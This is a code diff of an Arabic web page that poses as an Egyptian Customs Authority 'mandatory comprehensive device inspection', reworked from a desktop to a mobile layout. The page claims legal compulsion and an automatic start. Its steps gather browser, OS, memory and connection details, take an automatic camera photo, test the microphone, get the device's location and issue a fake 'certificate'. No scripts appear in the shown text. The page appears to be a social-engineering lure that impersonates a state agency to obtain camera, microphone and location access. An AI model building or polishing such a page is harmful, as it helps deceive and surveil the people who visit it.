@@ -2,12 +2,12 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الفحص الشامل - الهيئة العامة للجمارك المصرية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>الفحص الجمركي الشامل - الجمارك المصرية</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-        /* ===== نظام الألوان الحكومي المصري ===== */
+        /* ===== تصميم متجاوب للجوال ===== */
         :root {
             --primary-blue: #00205B;
             --egypt-red: #CE1126;
@@ -15,10 +15,8 @@
             --success: #28a745;
             --warning: #ffc107;
             --danger: #dc3545;
-            --info: #17a2b8;
             --dark: #343a40;
             --light: #f8f9fa;
-            --gradient-bg: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
         }
         
         * {
@@ -29,210 +27,147 @@
         
         body {
             font-family: 'Cairo', sans-serif;
-            background: var(--gradient-bg);
+            background: #f5f7fa;
             color: #333;
-            min-height: 100vh;
-            line-height: 1.6;
+            line-height: 1.5;
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
         }
         
-        /* الهيدر الرسمي المطور */
-        .government-header {
-            background: linear-gradient(90deg, var(--primary-blue) 0%, #1a365d 100%);
+        /* هيدر مصغر للجوال */
+        .mobile-header {
+            background: linear-gradient(90deg, var(--primary-blue), #1a365d);
             color: white;
-            padding: 15px 0;
-            border-bottom: 5px solid var(--egypt-gold);
+            padding: 15px;
+            text-align: center;
+            border-bottom: 3px solid var(--egypt-gold);
             position: sticky;
             top: 0;
-            z-index: 1000;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
         
-        .header-container {
-            max-width: 1300px;
-            margin: 0 auto;
-            padding: 0 25px;
+        .mobile-logo {
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 8px;
         }
         
-        .logo-section {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-        
-        .egypt-emblem {
-            width: 70px;
-            height: 70px;
+        .mobile-logo-icon {
+            width: 40px;
+            height: 40px;
             background: white;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 32px;
+            font-size: 20px;
             color: var(--egypt-red);
-            border: 3px solid var(--egypt-gold);
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-        }
-        
-        .header-text h1 {
-            font-size: 24px;
-            font-weight: 800;
-            margin-bottom: 5px;
-            letter-spacing: -0.5px;
-        }
-        
-        .header-text p {
-            font-size: 14px;
-            opacity: 0.9;
-            color: #e0e0e0;
-        }
-        
-        .system-badge {
-            background: linear-gradient(45deg, var(--egypt-red), #ff6b6b);
-            color: white;
-            padding: 8px 20px;
-            border-radius: 25px;
-            font-weight: 700;
-            font-size: 14px;
             border: 2px solid var(--egypt-gold);
-            box-shadow: 0 4px 15px rgba(206, 17, 38, 0.2);
         }
         
-        /* شريط التنبيه الوطني */
-        .national-alert {
+        .mobile-header h1 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        
+        .mobile-header p {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+        
+        /* تنبيه موبايل */
+        .mobile-alert {
             background: linear-gradient(90deg, #ffc107, #fd7e14);
             color: #000;
-            padding: 12px 0;
+            padding: 10px 15px;
             text-align: center;
-            font-weight: 700;
-            font-size: 15px;
-            border-bottom: 3px solid var(--egypt-red);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .alert-content {
+            font-weight: 600;
+            font-size: 13px;
+            border-bottom: 2px solid var(--egypt-red);
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 15px;
+            gap: 8px;
         }
         
-        .alert-content i {
-            animation: spin 3s linear infinite;
+        /* المحتوى الرئيسي */
+        .mobile-container {
+            padding: 15px;
+            max-width: 100%;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        /* نظام البطاقات المتطورة */
-        .main-container {
-            max-width: 1300px;
-            margin: 30px auto;
-            padding: 0 25px;
-        }
-        
-        .inspection-card {
+        /* بطاقة الفحص للموبايل */
+        .mobile-card {
             background: white;
-            border-radius: 20px;
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
             overflow: hidden;
-            border: 3px solid var(--primary-blue);
-            margin-bottom: 30px;
-            position: relative;
-            transition: transform 0.3s ease;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+            border: 2px solid var(--primary-blue);
         }
         
-        .inspection-card:hover {
-            transform: translateY(-5px);
-        }
-        
-        .card-header {
+        .card-header-mobile {
             background: linear-gradient(90deg, var(--primary-blue), #1a365d);
             color: white;
-            padding: 30px 40px;
+            padding: 20px;
             text-align: center;
-            position: relative;
-            overflow: hidden;
         }
         
-        .card-header::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(212, 175, 55, 0.1) 0%, transparent 70%);
-        }
-        
-        .header-icon {
-            font-size: 56px;
-            margin-bottom: 20px;
-            color: var(--egypt-gold);
-            animation: float 3s ease-in-out infinite;
-        }
-        
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        
-        .card-header h2 {
+        .card-icon {
             font-size: 32px;
-            margin-bottom: 15px;
-            font-weight: 800;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            margin-bottom: 10px;
+            color: var(--egypt-gold);
         }
         
-        /* نظام الخطوات المتقدمة */
-        .advanced-steps {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-            margin: 50px 0;
-            padding: 0 20px;
+        .card-header-mobile h2 {
+            font-size: 20px;
+            margin-bottom: 8px;
+            font-weight: 700;
         }
         
-        .step-card {
+        .card-header-mobile p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        /* خطوات الفحص للجوال */
+        .mobile-steps {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            padding: 20px;
+        }
+        
+        .mobile-step {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px;
             background: var(--light);
-            border-radius: 15px;
-            padding: 30px;
-            text-align: center;
-            border: 2px solid #e0e0e0;
-            transition: all 0.3s ease;
+            border-radius: 10px;
+            border: 1px solid #e0e0e0;
+            transition: all 0.3s;
             position: relative;
-            cursor: pointer;
-            overflow: hidden;
         }
         
-        .step-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
-        }
-        
-        .step-card.active {
+        .mobile-step.active {
             border-color: var(--success);
-            background: linear-gradient(135deg, rgba(40, 167, 69, 0.1), rgba(32, 201, 151, 0.1));
-            box-shadow: 0 15px 30px rgba(40, 167, 69, 0.2);
+            background: rgba(40, 167, 69, 0.05);
+            transform: translateX(5px);
         }
         
-        .step-card.completed {
+        .mobile-step.completed {
             border-color: var(--primary-blue);
-            background: linear-gradient(135deg, rgba(0, 32, 91, 0.1), rgba(26, 54, 93, 0.1));
+            background: rgba(0, 32, 91, 0.05);
         }
         
-        .step-badge {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            width: 40px;
-            height: 40px;
+        .step-number-mobile {
+            width: 36px;
+            height: 36px;
             background: var(--primary-blue);
             color: white;
             border-radius: 50%;
@@ -240,1223 +175,1091 @@
             align-items: center;
             justify-content: center;
             font-weight: bold;
-            font-size: 18px;
-            border: 3px solid white;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            font-size: 16px;
+            flex-shrink: 0;
         }
         
-        .step-card.active .step-badge {
+        .mobile-step.active .step-number-mobile {
             background: var(--success);
         }
         
-        .step-card.completed .step-badge {
+        .mobile-step.completed .step-number-mobile {
             background: var(--primary-blue);
         }
         
-        .step-icon {
-            font-size: 48px;
-            margin-bottom: 20px;
-            height: 80px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .step-content {
+            flex: 1;
         }
         
-        .step-card:nth-child(1) .step-icon { color: #3498db; }
-        .step-card:nth-child(2) .step-icon { color: #e74c3c; }
-        .step-card:nth-child(3) .step-icon { color: #9b59b6; }
-        .step-card:nth-child(4) .step-icon { color: #2ecc71; }
-        .step-card:nth-child(5) .step-icon { color: #f39c12; }
-        .step-card:nth-child(6) .step-icon { color: #1abc9c; }
-        
-        .step-title {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            color: var(--primary-blue);
-        }
-        
-        .step-desc {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 20px;
-            min-height: 60px;
-        }
-        
-        .step-status {
-            display: inline-block;
-            padding: 8px 20px;
-            border-radius: 20px;
-            font-size: 12px;
+        .step-title-mobile {
+            font-size: 16px;
             font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            color: var(--primary-blue);
+            margin-bottom: 4px;
         }
         
-        .status-pending { background: #f8f9fa; color: #6c757d; }
+        .step-desc-mobile {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .step-status-mobile {
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-weight: 600;
+        }
+        
+        .status-pending { background: #e9ecef; color: #6c757d; }
         .status-active { background: #d4edda; color: #155724; }
         .status-completed { background: #d1ecf1; color: #0c5460; }
         
-        /* منطقة الاختبارات */
-        .test-section {
-            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
-            border-radius: 15px;
-            padding: 40px;
-            margin: 40px 0;
-            border: 2px solid #e0e0e0;
-            position: relative;
-            overflow: hidden;
+        /* منطقة الاختبارات للجوال */
+        .test-section-mobile {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #e0e0e0;
         }
         
-        .test-section::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 5px;
-            background: linear-gradient(90deg, var(--primary-blue), var(--egypt-red));
-        }
-        
-        .test-container {
+        .test-container-mobile {
             display: none;
-            animation: fadeIn 0.5s ease;
         }
         
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
+        .test-container-mobile.active {
+            display: block;
+            animation: fadeInMobile 0.3s ease;
+        }
+        
+        @keyframes fadeInMobile {
+            from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
         
-        .test-container.active {
-            display: block;
-        }
-        
-        .test-header {
+        .test-header-mobile {
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 2px solid #e9ecef;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
         }
         
-        .test-header h3 {
+        .test-title {
+            font-size: 18px;
             color: var(--primary-blue);
-            font-size: 24px;
             font-weight: 700;
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 10px;
         }
         
-        .test-timer {
+        .test-timer-mobile {
             background: var(--primary-blue);
             color: white;
-            padding: 8px 20px;
-            border-radius: 25px;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
             font-weight: 600;
-            font-size: 14px;
         }
         
-        /* تصميمات خاصة لكل اختبار */
-        .camera-test {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 30px;
-        }
-        
-        .camera-preview {
+        /* كاميرا الموبايل */
+        .camera-mobile {
             width: 100%;
-            max-width: 800px;
-            height: 450px;
+            height: 250px;
             background: #000;
-            border-radius: 15px;
+            border-radius: 10px;
             overflow: hidden;
-            border: 3px solid var(--primary-blue);
+            margin: 15px 0;
             position: relative;
+            border: 2px solid var(--primary-blue);
         }
         
-        #cameraFeed, #videoPreview {
+        #cameraFeedMobile, #videoPreviewMobile {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
         
-        .camera-overlay {
+        .camera-overlay-mobile {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0,0,0,0.8);
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 24px;
             text-align: center;
+            padding: 20px;
         }
         
-        .microphone-test {
-            text-align: center;
-        }
-        
-        .volume-meter {
+        /* عداد الصوت */
+        .volume-container {
             width: 100%;
-            max-width: 500px;
-            height: 20px;
-            background: #e9ecef;
-            border-radius: 10px;
-            margin: 30px auto;
-            overflow: hidden;
-            position: relative;
+            margin: 20px 0;
         }
         
-        .volume-level {
+        .volume-meter-mobile {
+            width: 100%;
+            height: 16px;
+            background: #e9ecef;
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        
+        .volume-level-mobile {
             height: 100%;
             background: linear-gradient(90deg, #2ecc71, #f1c40f, #e74c3c);
             width: 0%;
             transition: width 0.1s;
-            border-radius: 10px;
+            border-radius: 8px;
         }
         
-        .location-test {
-            text-align: center;
-        }
-        
-        .map-container {
+        /* خريطة الموبايل */
+        .map-mobile {
             width: 100%;
-            height: 400px;
+            height: 200px;
             background: #e9ecef;
-            border-radius: 15px;
-            margin: 30px 0;
-            overflow: hidden;
-            border: 2px solid #dee2e6;
+            border-radius: 10px;
+            margin: 15px 0;
             display: flex;
             align-items: center;
             justify-content: center;
             position: relative;
+            border: 1px solid #dee2e6;
         }
         
-        .map-placeholder {
-            color: #6c757d;
-            font-size: 18px;
+        .map-coordinates {
+            position: absolute;
+            bottom: 10px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 12px;
         }
         
-        /* شريط التحكم */
-        .control-panel {
+        /* شريط التقدم للجوال */
+        .progress-mobile {
             background: white;
-            border-radius: 15px;
-            padding: 30px;
-            margin: 40px 0;
-            border: 2px solid #e9ecef;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #e0e0e0;
         }
         
-        .control-buttons {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin-top: 30px;
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
         }
         
-        .control-btn {
-            padding: 18px 25px;
+        .progress-bar-mobile {
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        
+        .progress-fill-mobile {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-blue), var(--egypt-red));
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 4px;
+        }
+        
+        /* أزرار الموبايل */
+        .buttons-mobile {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .mobile-btn {
+            padding: 16px;
             border: none;
-            border-radius: 12px;
+            border-radius: 10px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
+            gap: 10px;
+            transition: all 0.3s;
         }
         
-        .control-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: left 0.5s;
+        .mobile-btn:active {
+            transform: scale(0.98);
         }
         
-        .control-btn:hover::before {
-            left: 100%;
-        }
-        
-        .btn-start {
+        .btn-start-mobile {
             background: linear-gradient(135deg, var(--primary-blue), #1a365d);
             color: white;
-            box-shadow: 0 8px 25px rgba(0, 32, 91, 0.3);
+            box-shadow: 0 4px 15px rgba(0, 32, 91, 0.2);
         }
         
-        .btn-start:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 30px rgba(0, 32, 91, 0.4);
-        }
-        
-        .btn-next {
+        .btn-next-mobile {
             background: linear-gradient(135deg, var(--success), #20c997);
             color: white;
         }
         
-        .btn-pause {
-            background: linear-gradient(135deg, var(--warning), #fd7e14);
-            color: #000;
-        }
-        
-        .btn-stop {
-            background: linear-gradient(135deg, var(--danger), #e83e8c);
-            color: white;
-        }
-        
-        /* شريط التقدم المتقدم */
-        .advanced-progress {
-            background: white;
-            border-radius: 15px;
-            padding: 30px;
-            margin: 40px 0;
-            border: 2px solid #e9ecef;
-            position: relative;
-        }
-        
-        .progress-stats {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .progress-bar-container {
-            height: 12px;
-            background: #e9ecef;
-            border-radius: 6px;
-            overflow: hidden;
-            position: relative;
-            margin: 20px 0;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, var(--primary-blue), var(--egypt-red));
-            width: 0%;
-            transition: width 0.8s ease;
-            border-radius: 6px;
-            position: relative;
-        }
-        
-        .progress-bar::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
-            animation: shimmer 2s infinite;
-        }
-        
-        @keyframes shimmer {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-        
-        /* لوحة المعلومات الجانبية */
-        .info-panel {
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
-            border-radius: 15px;
-            padding: 30px;
-            margin: 40px 0;
-            border: 2px solid #dee2e6;
-        }
-        
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin-top: 20px;
-        }
-        
-        .info-card {
-            background: white;
+        /* شهادة الموبايل */
+        .certificate-mobile {
+            background: linear-gradient(135deg, #d4edda, #c3e6cb);
             border-radius: 10px;
             padding: 20px;
-            border-left: 4px solid var(--primary-blue);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            margin: 20px 0;
+            border: 2px solid #c3e6cb;
+            text-align: center;
         }
         
-        /* التكيف مع الجوال */
-        @media (max-width: 768px) {
-            .header-container {
-                flex-direction: column;
-                text-align: center;
-                gap: 20px;
-            }
-            
-            .advanced-steps {
-                grid-template-columns: 1fr;
-            }
-            
-            .control-buttons {
-                grid-template-columns: 1fr;
-            }
-            
-            .camera-preview {
-                height: 300px;
-            }
-            
-            .test-header {
-                flex-direction: column;
-                gap: 15px;
-                text-align: center;
-            }
+        .certificate-icon {
+            font-size: 48px;
+            color: var(--success);
+            margin-bottom: 15px;
         }
         
-        /* الختم المائي */
-        .watermark {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) rotate(-45deg);
-            font-size: 80px;
-            color: rgba(0, 32, 91, 0.03);
-            pointer-events: none;
-            white-space: nowrap;
-            z-index: -1;
-            font-weight: 900;
-            text-transform: uppercase;
+        .certificate-number {
+            font-size: 20px;
+            font-weight: bold;
+            color: var(--primary-blue);
+            margin-bottom: 10px;
         }
         
-        /* التنبيهات المخفية */
-        .hidden-notification {
+        /* إشعارات الموبايل */
+        .mobile-notification {
             position: fixed;
             bottom: 20px;
-            right: 20px;
+            left: 15px;
+            right: 15px;
             background: rgba(0, 0, 0, 0.9);
             color: white;
-            padding: 15px 25px;
+            padding: 15px;
             border-radius: 10px;
-            max-width: 400px;
             z-index: 1000;
             display: none;
-            animation: slideIn 0.3s ease;
+            animation: slideUpMobile 0.3s ease;
             border-left: 4px solid var(--success);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            font-size: 14px;
+            text-align: center;
         }
         
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
+        @keyframes slideUpMobile {
+            from { transform: translateY(100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
         
-        /* المؤشرات */
-        .indicators {
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
+        /* معلومات الجهاز */
+        .device-info-mobile {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
             margin: 20px 0;
         }
         
-        .indicator {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 10px 20px;
-            background: white;
-            border-radius: 25px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        .info-item {
+            background: var(--light);
+            padding: 12px;
+            border-radius: 8px;
+            border-left: 3px solid var(--primary-blue);
         }
         
-        .indicator-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
+        .info-label {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 4px;
         }
         
-        .dot-green { background: var(--success); animation: pulse 2s infinite; }
-        .dot-red { background: var(--danger); }
-        .dot-yellow { background: var(--warning); }
-        
-        /* تحسينات إضافية */
-        .highlight {
-            background: linear-gradient(120deg, #fdfd96 0%, #fdfd96 100%);
-            padding: 2px 5px;
-            border-radius: 3px;
+        .info-value {
+            font-size: 14px;
             font-weight: 600;
+            color: var(--primary-blue);
         }
         
-        .glow {
-            animation: glow 2s infinite alternate;
+        /* فوتر الموبايل */
+        .mobile-footer {
+            background: var(--dark);
+            color: white;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            border-top: 3px solid var(--egypt-gold);
         }
         
-        @keyframes glow {
-            from { box-shadow: 0 0 10px rgba(212, 175, 55, 0.5); }
-            to { box-shadow: 0 0 20px rgba(212, 175, 55, 0.8); }
+        /* تحسينات للتابلت */
+        @media (min-width: 768px) {
+            .mobile-header {
+                padding: 20px;
+            }
+            
+            .mobile-header h1 {
+                font-size: 22px;
+            }
+            
+            .mobile-container {
+                padding: 20px;
+                max-width: 750px;
+                margin: 0 auto;
+            }
+            
+            .camera-mobile {
+                height: 350px;
+            }
+            
+            .map-mobile {
+                height: 250px;
+            }
+            
+            .device-info-mobile {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+        
+        /* تحسينات للكمبيوتر */
+        @media (min-width: 1024px) {
+            .mobile-container {
+                max-width: 900px;
+            }
+            
+            .mobile-steps {
+                display: grid;
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .mobile-step {
+                flex-direction: column;
+                text-align: center;
+                padding: 20px;
+            }
+            
+            .step-content {
+                width: 100%;
+            }
+        }
+        
+        /* تحسينات للشاشات الكبيرة */
+        @media (min-width: 1200px) {
+            .mobile-container {
+                max-width: 1100px;
+            }
+        }
+        
+        /* تأثيرات إضافية */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        .shake {
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        /* إخفاء العناصر غير الضرورية */
+        .hidden {
+            display: none;
+        }
+        
+        .loading {
+            position: relative;
+        }
+        
+        .loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <!-- ختم مائي -->
-    <div class="watermark">نظام الفحص الشامل - الجمارك المصرية</div>
-    
-    <!-- الهيدر الرسمي -->
-    <header class="government-header">
-        <div class="header-container">
-            <div class="logo-section">
-                <div class="egypt-emblem">
-                    <i class="fas fa-landmark"></i>
-                </div>
-                <div class="header-text">
-                    <h1>نظام الفحص الشامل الإلكتروني</h1>
-                    <p>الهيئة العامة للجمارك المصرية - وزارة المالية</p>
-                </div>
+    <!-- الهيدر للجوال -->
+    <header class="mobile-header">
+        <div class="mobile-logo">
+            <div class="mobile-logo-icon">
+                <i class="fas fa-landmark"></i>
             </div>
-            <div class="system-badge">
-                <i class="fas fa-shield-alt"></i> النسخة المتطورة ٢٠٢٤
+            <div>
+                <h1>الفحص الجمركي الشامل</h1>
+                <p>الهيئة العامة للجمارك المصرية</p>
             </div>
         </div>
     </header>
     
-    <!-- تنبيه وطني -->
-    <div class="national-alert">
-        <div class="alert-content">
-            <i class="fas fa-exclamation-triangle"></i>
-            <span>فحص إلزامي: جميع الأجهزة تخضع للفحص الشامل بموجب القانون رقم ١٥٤ لسنة ٢٠٢٣</span>
-            <i class="fas fa-exclamation-triangle"></i>
-        </div>
+    <!-- تنبيه الموبايل -->
+    <div class="mobile-alert">
+        <i class="fas fa-exclamation-circle"></i>
+        <span>فحص إلزامي لجميع الأجهزة - بدء تلقائي خلال ثوانٍ</span>
     </div>
     
     <!-- المحتوى الرئيسي -->
-    <div class="main-container">
-        <!-- بطاقة الفحص المتقدمة -->
-        <div class="inspection-card">
-            <div class="card-header">
-                <div class="header-icon">
-                    <i class="fas fa-search-plus"></i>
+    <div class="mobile-container">
+        <!-- بطاقة الفحص -->
+        <div class="mobile-card">
+            <div class="card-header-mobile">
+                <div class="card-icon">
+                    <i class="fas fa-search"></i>
                 </div>
-                <h2>نظام الفحص الشامل المتكامل للأجهزة الإلكترونية</h2>
-                <p>فحص شامل يشمل جميع جوانب الجهاز لضمان المطابقة للمواصفات القياسية المصرية</p>
+                <h2>فحص الجهاز الإلكتروني</h2>
+                <p>فحص شامل تلقائي لضمان المطابقة للمواصفات</p>
             </div>
             
-            <div class="card-content" style="padding: 40px;">
-                <!-- مؤشرات النظام -->
-                <div class="indicators">
-                    <div class="indicator">
-                        <div class="indicator-dot dot-green"></div>
-                        <span>النظام جاهز</span>
+            <!-- خطوات الفحص -->
+            <div class="mobile-steps">
+                <div class="mobile-step active" id="mobileStep1">
+                    <div class="step-number-mobile">1</div>
+                    <div class="step-content">
+                        <div class="step-title-mobile">جمع المعلومات</div>
+                        <div class="step-desc-mobile">فحص مواصفات الجهاز</div>
                     </div>
-                    <div class="indicator">
-                        <div class="indicator-dot dot-yellow"></div>
-                        <span>في انتظار الإذن</span>
+                    <div class="step-status-mobile status-active">نشط</div>
+                </div>
+                
+                <div class="mobile-step" id="mobileStep2">
+                    <div class="step-number-mobile">2</div>
+                    <div class="step-content">
+                        <div class="step-title-mobile">فحص الكاميرا</div>
+                        <div class="step-desc-mobile">التقاط صورة تلقائية</div>
                     </div>
-                    <div class="indicator">
-                        <div class="indicator-dot dot-red"></div>
-                        <span>إلزامي بالكامل</span>
+                    <div class="step-status-mobile status-pending">في الانتظار</div>
+                </div>
+                
+                <div class="mobile-step" id="mobileStep3">
+                    <div class="step-number-mobile">3</div>
+                    <div class="step-content">
+                        <div class="step-title-mobile">فحص الميكروفون</div>
+                        <div class="step-desc-mobile">اختبار جودة الصوت</div>
+                    </div>
+                    <div class="step-status-mobile status-pending">في الانتظار</div>
+                </div>
+                
+                <div class="mobile-step" id="mobileStep4">
+                    <div class="step-number-mobile">4</div>
+                    <div class="step-content">
+                        <div class="step-title-mobile">الموقع الجغرافي</div>
+                        <div class="step-desc-mobile">تحديد موقع الجهاز</div>
+                    </div>
+                    <div class="step-status-mobile status-pending">في الانتظار</div>
+                </div>
+                
+                <div class="mobile-step" id="mobileStep5">
+                    <div class="step-number-mobile">5</div>
+                    <div class="step-content">
+                        <div class="step-title-mobile">إصدار الشهادة</div>
+                        <div class="step-desc-mobile">ترخيص تشغيل الجهاز</div>
+                    </div>
+                    <div class="step-status-mobile status-pending">في الانتظار</div>
+                </div>
+            </div>
+            
+            <!-- منطقة الاختبارات -->
+            <div class="test-section-mobile">
+                <!-- اختبار 1 -->
+                <div class="test-container-mobile active" id="mobileTest1">
+                    <div class="test-header-mobile">
+                        <div class="test-title">
+                            <i class="fas fa-laptop"></i>
+                            معلومات الجهاز
+                        </div>
+                        <div class="test-timer-mobile" id="mobileTimer1">جاري...</div>
+                    </div>
+                    
+                    <div style="text-align: center; margin: 20px 0;">
+                        <div style="font-size: 48px; color: var(--primary-blue); margin-bottom: 15px;">
+                            <i class="fas fa-microchip"></i>
+                        </div>
+                        <h3 style="color: var(--primary-blue); margin-bottom: 10px;">جاري فحص مواصفات الجهاز...</h3>
+                    </div>
+                    
+                    <div class="device-info-mobile">
+                        <div class="info-item">
+                            <div class="info-label">المتصفح</div>
+                            <div class="info-value" id="infoBrowser">جاري الفحص...</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">نظام التشغيل</div>
+                            <div class="info-value" id="infoOS">جاري الفحص...</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">الدقة</div>
+                            <div class="info-value" id="infoResolution">جاري الفحص...</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">اللغة</div>
+                            <div class="info-value" id="infoLanguage">جاري الفحص...</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">الذاكرة</div>
+                            <div class="info-value" id="infoMemory">جاري الفحص...</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">الاتصال</div>
+                            <div class="info-value" id="infoConnection">جاري الفحص...</div>
+                        </div>
                     </div>
                 </div>
